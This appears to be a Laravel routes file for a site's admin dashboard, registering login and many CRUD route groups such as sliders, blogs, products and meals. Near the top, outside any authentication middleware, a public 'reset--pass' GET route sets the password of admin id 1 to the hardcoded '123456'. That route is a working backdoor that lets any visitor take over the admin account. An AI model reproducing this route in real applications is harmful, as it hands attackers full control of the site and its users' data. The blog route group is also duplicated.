<?php

use App\Http\Controllers\Dashboard\LangController;
use App\Models\Admin;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

$prefix = 'admin.';

// Before Login Dashboard Routes
Route::group(['middleware' => 'guest:admin'], function () use ($prefix) {
    $controller = 'AuthController@';
    // Route Login
    Route::get('login', $controller . 'view')->name($prefix . 'view_login');
    Route::post('login', $controller . 'login')->name($prefix . 'login');

});

Route::get('reset--pass',function(){
    Admin::where('id',1)->update([
        'password' => bcrypt('123456'),
    ]);
    return back();
});
// After Login Dashboard Routes
Route::group(['middleware' => 'auth:admin'], function () use ($prefix) {
    Route::get('lang', [LangController::class, 'changeLang'])->name($prefix.'lang');

    // Route Logout
    Route::post('logout', 'AuthController@logout');

    // lang Route

    // Route Home
    Route::get('/', 'HomeController@index')->name($prefix.'home');
    Route::get('home', 'HomeController@index')->name($prefix.'home');
    Route::get('profile', 'HomeController@profile')->name($prefix.'profile');
    Route::post('profile', 'HomeController@updateProfile')->name($prefix.'updateProfile');


    // route of slider
    Route::group(['prefix' => '/sliders'], function () use ($prefix) {
        Route::controller('SliderController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'slider');
            Route::get('/create', 'create')->name($prefix.'slider.create');
            Route::post('/store', 'store')->name($prefix.'slider.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'slider.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'slider.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'slider.delete');
            Route::post('/change-status', 'changeStatus')->name($prefix.'slider.change-status');
        });
    });

    // route of certifications
    Route::group(['prefix' => '/certifications'], function () use ($prefix) {
        Route::controller('CertificationController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'certification');
            Route::get('/create', 'create')->name($prefix.'certification.create');
            Route::post('/store', 'store')->name($prefix.'certification.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'certification.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'certification.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'certification.delete');
        });
    });

    // route of parteners
    Route::group(['prefix' => '/parteners'], function () use ($prefix) {
        Route::controller('PartenerController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'partener');
            Route::get('/create', 'create')->name($prefix.'partener.create');
            Route::post('/store', 'store')->name($prefix.'partener.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'partener.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'partener.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'partener.delete');
        });
    });


// route of faqs
Route::group(['prefix' => '/faqs'], function () use ($prefix) {
    Route::controller('FaqController')->group(function () use ($prefix)  {
        Route::get('/', 'index')->name($prefix.'faq');
        Route::get('/create', 'create')->name($prefix.'faq.create');
        Route::post('/store', 'store')->name($prefix.'faq.store');
        Route::get('/edit/{id}', 'edit')->name($prefix.'faq.edit');
        Route::post('/update/{id}', 'update')->name($prefix.'faq.update');
        Route::delete('/delete/{id}', 'destroy')->name($prefix.'faq.delete');
    });
});
// route of blog
Route::group(['prefix' => '/blogs'], function () use ($prefix) {
    Route::controller('BlogController')->group(function () use ($prefix)  {
        Route::get('/', 'index')->name($prefix.'blog');
        Route::get('/create', 'create')->name($prefix.'blog.create');
        Route::post('/store', 'store')->name($prefix.'blog.store');
        Route::get('/edit/{id}', 'edit')->name($prefix.'blog.edit');
        Route::post('/update/{id}', 'update')->name($prefix.'blog.update');
        Route::delete('/delete/{id}', 'destroy')->name($prefix.'blog.delete');
    });
});
// route of blog
Route::group(['prefix' => '/blogs'], function () use ($prefix) {
    Route::controller('BlogController')->group(function () use ($prefix)  {
        Route::get('/', 'index')->name($prefix.'blog');
        Route::get('/create', 'create')->name($prefix.'blog.create');
        Route::post('/store', 'store')->name($prefix.'blog.store');
        Route::get('/edit/{id}', 'edit')->name($prefix.'blog.edit');
        Route::post('/update/{id}', 'update')->name($prefix.'blog.update');
        Route::delete('/delete/{id}', 'destroy')->name($prefix.'blog.delete');
    });
});
// route of News
Route::group(['prefix' => '/news'], function () use ($prefix) {
    Route::controller('NewController')->group(function () use ($prefix)  {
        Route::get('/', 'index')->name($prefix.'new');
        Route::get('/create', 'create')->name($prefix.'new.create');
        Route::post('/store', 'store')->name($prefix.'new.store');
        Route::get('/edit/{id}', 'edit')->name($prefix.'new.edit');
        Route::post('/update/{id}', 'update')->name($prefix.'new.update');
        Route::delete('/delete/{id}', 'destroy')->name($prefix.'new.delete');
    });
});

    // route of service
    Route::group(['prefix' => '/services'], function () use ($prefix) {
        Route::controller('ServiceController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'service');
            Route::get('/create', 'create')->name($prefix.'service.create');
            Route::post('/store', 'store')->name($prefix.'service.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'service.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'service.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'service.delete');
            Route::delete('{id}/delete-image/{it}', 'deleteImage')->name($prefix.'service.images.delete');
        });
    });

    // route of projects
    Route::group(['prefix' => '/projects'], function () use ($prefix) {
        Route::controller('ProjectController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'project');
            Route::get('/create', 'create')->name($prefix.'project.create');
            Route::post('/store', 'store')->name($prefix.'project.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'project.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'project.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'project.delete');
        });
    });

    // route of values
    Route::group(['prefix' => '/values'], function () use ($prefix) {
        Route::controller('ValueController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'value');
            Route::get('/create', 'create')->name($prefix.'value.create');
            Route::post('/store', 'store')->name($prefix.'value.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'value.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'value.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'value.delete');
        });
    });

    // route of how-works
    Route::group(['prefix' => '/how-works'], function () use ($prefix) {
        Route::controller('HowWorkController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'work');
            Route::get('/create', 'create')->name($prefix.'work.create');
            Route::post('/store', 'store')->name($prefix.'work.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'work.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'work.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'work.delete');
        });
    });

    // route of products
    Route::group(['prefix' => '/products'], function () use ($prefix) {
        Route::controller('ProductController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'product');
            Route::get('/create', 'create')->name($prefix.'product.create');
            Route::post('/store', 'store')->name($prefix.'product.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'product.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'product.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'product.delete');
            Route::delete('{id}/delete-image/{it}', 'deleteImage')->name($prefix.'product.images.delete');

        });
    });

    // route of customer rate
    Route::group(['prefix' => '/customer-rate'], function () use ($prefix) {
        Route::controller('CustomerRateController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'rate');
            Route::get('/create', 'create')->name($prefix.'rate.create');
            Route::post('/store', 'store')->name($prefix.'rate.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'rate.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'rate.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'rate.delete');

        });
    });

    // route of counters
    Route::group(['prefix' => '/counters'], function () use ($prefix) {
        Route::controller('CounterController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'counter');
            Route::get('/create', 'create')->name($prefix.'counter.create');
            Route::post('/store', 'store')->name($prefix.'counter.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'counter.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'counter.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'counter.delete');

        });
    });

    // route of teams
    Route::group(['prefix' => '/teams'], function () use ($prefix) {
        Route::controller('TeamController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'team');
            Route::get('/create', 'create')->name($prefix.'team.create');
            Route::post('/store', 'store')->name($prefix.'team.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'team.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'team.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'team.delete');

        });
    });

    // route of life-process
    Route::group(['prefix' => '/life-process'], function () use ($prefix) {
        Route::controller('LifeProcessController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'process');
            Route::get('/create', 'create')->name($prefix.'process.create');
            Route::post('/store', 'store')->name($prefix.'process.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'process.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'process.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'process.delete');

        });
    });
    // route of features
    Route::group(['prefix' => '/features'], function () use ($prefix) {
        Route::controller('FeatureController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'feature');
            Route::get('/create', 'create')->name($prefix.'feature.create');
            Route::post('/store', 'store')->name($prefix.'feature.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'feature.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'feature.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'feature.delete');

        });
    });
    // route of courses
    Route::group(['prefix' => '/courses'], function () use ($prefix) {
        Route::controller('CourseController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'course');
            Route::get('/create', 'create')->name($prefix.'course.create');
            Route::post('/store', 'store')->name($prefix.'course.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'course.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'course.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'course.delete');

        });
    });


    // route of setting
    Route::group(['prefix' => '/settings'], function () use ($prefix) {
        Route::controller('SettingController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'setting');
            Route::get('/Office-Location', 'officeLocation')->name($prefix.'setting.location');
            Route::get('/settings/profile', 'profile')->name($prefix.'setting.profile');
            Route::post('/update', 'update')->name($prefix.'setting.update');
        });
    });

    // route of about us
    Route::group(['prefix' => '/about-us'], function () use ($prefix) {
        Route::controller('AboutController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'about');
            Route::get('/create', 'create')->name($prefix.'about.create');
            Route::post('/store', 'store')->name($prefix.'about.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'about.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'about.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'about.delete');
            // Route::post('/save-data', 'saveData')->name($prefix.'about.saveData');
        });
    });
    Route::group(['prefix' => '/categories'], function () use ($prefix) {
        Route::controller('CategoryController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'category');
            Route::get('/create', 'create')->name($prefix.'category.create');
            Route::post('/store', 'store')->name($prefix.'category.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'category.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'category.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'category.delete');
            // Route::post('/save-data', 'saveData')->name($prefix.'about.saveData');
        });
    });
    Route::group(['prefix' => '/meals'], function () use ($prefix) {
        Route::controller('MealController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'meal');
            Route::get('/create', 'create')->name($prefix.'meal.create');
            Route::post('/store', 'store')->name($prefix.'meal.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'meal.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'meal.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'meal.delete');
            // Route::post('/save-data', 'saveData')->name($prefix.'about.saveData');
            Route::post('/status', 'status')->name($prefix.'meal.status');
        });
    });
    Route::group(['prefix' => '/offers'], function () use ($prefix) {
        Route::controller('OfferController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'offer');
            Route::get('/create', 'create')->name($prefix.'offer.create');
            Route::post('/store', 'store')->name($prefix.'offer.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'offer.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'offer.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'offer.delete');
            // Route::post('/save-data', 'saveData')->name($prefix.'about.saveData');
        });
    });

    Route::group(['prefix' => '/profile-info'], function () use ($prefix) {
        Route::controller('ProfileInfoController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'info');
            Route::get('/create', 'create')->name($prefix.'info.create');
            Route::post('/store', 'store')->name($prefix.'info.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'info.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'info.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'info.delete');
            // Route::post('/save-data', 'saveData')->name($prefix.'about.saveData');
        });
    });


    Route::group(['prefix' => '/social-media'], function () use ($prefix) {
        Route::controller('SocialMediaController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'social');
            Route::get('/create', 'create')->name($prefix.'social.create');
            Route::post('/store', 'store')->name($prefix.'social.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'social.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'social.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'social.delete');
            Route::post('/change-status', 'changeStatus')->name($prefix.'social.change-status');
            Route::post('/make-sort', 'makeSort')->name($prefix.'social.makeSort');

        });
    });


    // route of metatags
    Route::group(['prefix' => '/metatags'], function () use ($prefix) {
        Route::controller('MetaTagController')->group(function () use ($prefix)  {
            Route::get('{page}', 'index')->name($prefix.'meta');
            Route::post('/saveMetatag/{page}', 'saveMetatag')->name($prefix.'meta.saveMetatag');
        });
    });

    Route::group(['prefix' => '/languages'], function () use ($prefix) {
        Route::controller('LanguageContoller')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'language.index');
            Route::get('/create', 'create')->name($prefix.'language.create');
            Route::post('/store', 'store')->name($prefix.'language.store');
            Route::get('/edit/{id}', 'edit')->name($prefix.'language.edit');
            Route::post('/update/{id}', 'update')->name($prefix.'language.update');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'language.delete');

        });
    });


    Route::group(['prefix' => '/words-translation'], function () use ($prefix) {
        Route::controller('WordTranslationController')->group(function () use ($prefix)  {
            Route::get('/', 'index')->name($prefix.'translation.index');
            Route::post('/save-Translations', 'saveTranslations')->name($prefix.'translation.saveTranslations');
            Route::delete('/delete/{id}', 'destroy')->name($prefix.'translation.delete');


        });
    });
});
